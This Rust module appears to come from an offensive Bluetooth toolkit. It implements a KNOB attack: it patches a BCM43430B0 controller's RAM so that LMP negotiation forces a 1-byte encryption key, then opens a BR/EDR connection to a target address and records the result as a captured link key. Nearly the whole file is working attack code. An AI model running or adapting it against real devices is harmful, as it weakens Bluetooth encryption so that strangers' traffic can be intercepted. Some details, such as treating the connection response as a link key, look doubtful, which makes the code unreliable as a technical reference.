//! KNOB attack worker.
//!
//! Initiates a BR/EDR connection and forces minimum encryption key size
//! via LMP key negotiation. On BCM43430B0 this requires a patchram that
//! intercepts LMP_encryption_key_size_req and replies with key_size=1.

use std::time::Instant;

use super::hci::{HciCommand, HciSocket};
use super::{BtAttackResult, BtAttackType, BtCapture};

// HCI Link Control OGF
const OGF_LINK_CTL: u8 = 0x01;

// HCI opcodes
const CREATE_CONNECTION: u16 = 0x05;

// BCM vendor opcodes
const WRITE_RAM: u16 = 0x4C;

/// Patchram address for LMP key-size enforcement on BCM43430B0.
/// This is the LMP handler dispatch entry that we patch to force min key size.
const LMP_KEY_SIZE_PATCH_ADDR: u32 = 0x0021_3000;

/// KNOB attack: force minimum encryption key size on a BR/EDR connection.
///
/// Steps:
/// 1. Write patchram at the LMP key-size handler to force key_size=1
/// 2. Initiate HCI_Create_Connection to the target
/// 3. Capture the connection result
pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
    let start = Instant::now();
    log::info!("knob: targeting {} — forcing min key size", target_addr);

    // Step 1: Write patchram to force minimum key size in LMP negotiation.
    // The patch bytes set the key_size_req response to 1 byte.
    let patch_payload: [u8; 4] = [0x01, 0x00, 0x00, 0x00]; // key_size = 1
    let mut ram_params = Vec::with_capacity(8);
    ram_params.extend_from_slice(&LMP_KEY_SIZE_PATCH_ADDR.to_le_bytes());
    ram_params.push(patch_payload.len() as u8);
    ram_params.extend_from_slice(&patch_payload);

    let patch_cmd = HciCommand::vendor(WRITE_RAM, ram_params);
    if let Err(e) = hci.send_command(&patch_cmd) {
        log::info!("knob: patchram write failed: {}", e);
        return BtAttackResult {
            attack_type: BtAttackType::Knob,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("patchram write failed: {}", e)),
            timestamp: start,
        };
    }
    log::info!("knob: patchram written at 0x{:08X}", LMP_KEY_SIZE_PATCH_ADDR);

    // Step 2: Initiate BR/EDR connection.
    // HCI_Create_Connection parameters:
    //   BD_ADDR(6) + packet_type(2) + page_scan_rep_mode(1) + reserved(1) +
    //   clock_offset(2) + allow_role_switch(1)
    let bdaddr = parse_bdaddr_classic(target_addr);
    let mut params = Vec::with_capacity(13);
    params.extend_from_slice(&bdaddr);
    params.extend_from_slice(&0xCC18u16.to_le_bytes()); // packet_type: DM1,DH1,DM3,DH3,DM5,DH5
    params.push(0x02); // page_scan_rep_mode: R2
    params.push(0x00); // reserved
    params.extend_from_slice(&0x0000u16.to_le_bytes()); // clock_offset: none
    params.push(0x01); // allow_role_switch: yes

    let conn_cmd = HciCommand::new(OGF_LINK_CTL, CREATE_CONNECTION, params);
    match hci.send_command(&conn_cmd) {
        Ok(resp) => {
            log::info!(
                "knob: Create_Connection status={} data_len={}",
                resp.status,
                resp.data.len()
            );

            let capture = if !resp.data.is_empty() {
                Some(BtCapture::LinkKey {
                    address: target_addr.to_string(),
                    key: resp.data.clone(),
                })
            } else {
                None
            };

            let success = resp.status == 0;
            BtAttackResult {
                attack_type: BtAttackType::Knob,
                target_address: target_addr.to_string(),
                target_name: None,
                success,
                capture,
                error: if success {
                    None
                } else {
                    Some(format!("HCI status 0x{:02X}", resp.status))
                },
                timestamp: start,
            }
        }
        Err(e) => {
            log::info!("knob: Create_Connection failed: {}", e);
            BtAttackResult {
                attack_type: BtAttackType::Knob,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(e),
                timestamp: start,
            }
        }
    }
}

/// Parse BD_ADDR for classic BR/EDR (reversed byte order).
fn parse_bdaddr_classic(addr: &str) -> [u8; 6] {
    let mut bytes = [0u8; 6];
    let parts: Vec<&str> = addr.split(':').collect();
    if parts.len() == 6 {
        for (i, part) in parts.iter().enumerate() {
            bytes[5 - i] = u8::from_str_radix(part, 16).unwrap_or(0);
        }
    }
    bytes
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_bdaddr_classic() {
        let addr = parse_bdaddr_classic("11:22:33:44:55:66");
        assert_eq!(addr, [0x66, 0x55, 0x44, 0x33, 0x22, 0x11]);
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_stub() {
        let hci = HciSocket::open(0).unwrap();
        let result = run(&hci, "AA:BB:CC:DD:EE:FF");
        assert_eq!(result.attack_type, BtAttackType::Knob);
        assert!(result.success);
    }
}
